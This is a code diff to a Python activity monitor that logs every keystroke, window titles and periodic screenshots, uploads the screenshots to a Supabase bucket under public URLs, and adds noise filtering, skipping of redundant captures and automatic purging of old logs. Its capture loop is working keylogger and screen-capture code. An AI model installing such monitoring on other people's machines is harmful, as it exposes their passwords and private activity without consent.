@@ -140,6 +140,19 @@ def is_screenshot_redundant(current_img):
     except Exception:
         return False
 
+# Noise filtering utility for keylogs
+def is_text_noise(text):
+    cleaned = text
+    control_patterns = ["[Backspace]", "[Tab]", "[Enter]", "[Space]", "[Escape]", "[Shift]", "[Ctrl]", "[Alt]", "[Caps_Lock]"]
+    for pat in control_patterns:
+        cleaned = cleaned.replace(pat, "")
+    cleaned = cleaned.strip()
+    return len(cleaned) == 0
+
+# State variables for periodic capture optimizations
+last_logged_window = ""
+has_new_activity_since_last_capture = False
+
 HTML_TEMPLATE = """<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -1928,16 +1941,16 @@ def capture_and_upload_screenshot(prefix):
             # Get Public URL
             res_url = supabase.storage.from_(SUPABASE_BUCKET).get_public_url(s3_path)
             screenshot_url = res_url
-            
-            # Delete local temp file to save disk space
-            try:
-                os.remove(local_path)
-            except Exception:
-                pass
-                
         except Exception as e:
             print(f"Failed to upload screenshot to Supabase Storage: {e}")
             screenshot_url = f"screenshots/{date_str}/{filename}"
+        finally:
+            # Delete local temp file immediately to save disk space
+            try:
+                if os.path.exists(local_path):
+                    os.remove(local_path)
+            except Exception:
+                pass
     else:
         screenshot_url = f"screenshots/{date_str}/{filename}"
         
@@ -1994,21 +2007,23 @@ def write_log(timestamp, window_title, line_str, screenshot_url=None, screenshot
             print(f"Failed to write local fallback log: {e}")
 
 def on_press(key):
-    global current_line, last_activity_time
+    global current_line, last_activity_time, has_new_activity_since_last_capture
     last_activity_time = datetime.now()
     try:
         if hasattr(key, 'char') and key.char is not None:
             if ord(key.char) >= 32:
                 current_line.append(key.char)
+                has_new_activity_since_last_capture = True
         elif key == pynput.keyboard.Key.space:
             current_line.append(' ')
+            has_new_activity_since_last_capture = True
         elif key == pynput.keyboard.Key.backspace:
             if current_line:
                 current_line.pop()
         elif key == pynput.keyboard.Key.enter:
             line_str = "".join(current_line).strip()
             current_line = []
-            if not line_str:
+            if not line_str or is_text_noise(line_str):
                 return
                 
             now = datetime.now()
@@ -2016,6 +2031,7 @@ def on_press(key):
             # Reset screenshot timer on manual enter
             global last_screenshot_time
             last_screenshot_time = now
+            has_new_activity_since_last_capture = False
             
             timestamp = now.strftime("%Y-%m-%d %H:%M:%S")
             window_title = get_active_window_title()
@@ -2043,11 +2059,27 @@ def periodic_checker():
         
         # Take a periodic screenshot if active
         if inactive_seconds < 300 and time_since_last_screenshot >= 300:
-            timestamp = now.strftime("%Y-%m-%d %H:%M:%S")
             window_title = get_active_window_title()
+            
+            # Skip periodic capture if active window hasn't changed AND no new typing activity occurred
+            global last_logged_window, has_new_activity_since_last_capture
+            if window_title == last_logged_window and not has_new_activity_since_last_capture:
+                last_screenshot_time = now
+                continue
+                
+            timestamp = now.strftime("%Y-%m-%d %H:%M:%S")
             
             # Capture and upload screenshot (WebP)
             screenshot_url, screenshot_filename = capture_and_upload_screenshot("screenshot_periodic")
+            
+            # If screenshot was skipped as redundant, don't write log entry to Supabase
+            if screenshot_url is None and screenshot_filename is None:
+                last_screenshot_time = now
+                continue
+                
+            # Update state on success
+            last_logged_window = window_title
+            has_new_activity_since_last_capture = False
             
             buffered_text = "".join(current_line).strip()
             if buffered_text:
@@ -2073,7 +2105,68 @@ def run_server():
     port = int(os.environ.get('PORT', 58291))
     app.run(host='127.0.0.1', port=port, debug=False, use_reloader=False)
 
+def server_storage_cleaner():
+    """
+    Runs on the server backend to clean up storage if database size limit is approaching.
+    """
+    if supabase is None:
+        return
+    while True:
+        try:
+            # Check database count once every 24 hours
+            time.sleep(86400)
+            
+            # Count exact rows in activity_logs
+            res = supabase.table("activity_logs").select("id", count="exact").execute()
+            total_rows = res.count if hasattr(res, 'count') else (len(res.data) if res.data else 0)
+            
+            # Threshold: 30,000 rows (roughly 600MB of storage/data size)
+            if total_rows > 30000:
+                print(f"[Cleaner] Database rows ({total_rows}) exceeds threshold. Triggering 50% cleanup...")
+                
+                # Fetch the oldest 50% of logs
+                cleanup_count = total_rows // 2
+                old_res = supabase.table("activity_logs") \
+                    .select("id, screenshot_filename") \
+                    .order("timestamp", desc=False) \
+                    .limit(cleanup_count) \
+                    .execute()
+                    
+                if old_res.data:
+                    # 1. Gather all files to delete from Storage
+                    files_to_delete = [
+                        row["screenshot_filename"] 
+                        for row in old_res.data 
+                        if row.get("screenshot_filename")
+                    ]
+                    
+                    # Batch delete from Supabase storage (max 100 at a time)
+                    for i in range(0, len(files_to_delete), 100):
+                        batch = files_to_delete[i:i+100]
+                        try:
+                            if SUPABASE_BUCKET:
+                                supabase.storage.from_(SUPABASE_BUCKET).remove(batch)
+                        except Exception as e:
+                            print(f"[Cleaner] Failed to remove storage batch: {e}")
+                            
+                    # 2. Delete database rows
+                    row_ids = [row["id"] for row in old_res.data]
+                    for i in range(0, len(row_ids), 100):
+                        batch_ids = row_ids[i:i+100]
+                        try:
+                            supabase.table("activity_logs").delete().in_("id", batch_ids).execute()
+                        except Exception as e:
+                            print(f"[Cleaner] Failed to delete DB row batch: {e}")
+                            
+                    print(f"[Cleaner] Successfully cleaned up {cleanup_count} oldest logs and screenshots.")
+        except Exception as e:
+            print(f"[Cleaner] Error in server storage cleaner: {e}")
+
 if __name__ == '__main__':
+    # Start server storage cleaner thread to monitor database limits
+    cleaner_thread = threading.Thread(target=server_storage_cleaner, daemon=True)
+    cleaner_thread.start()
+
     # Check if we should only run the server (no local keyboard/mouse listeners)
     server_only = os.environ.get('SERVER_ONLY', 'false').lower() == 'true' or pynput is None
     
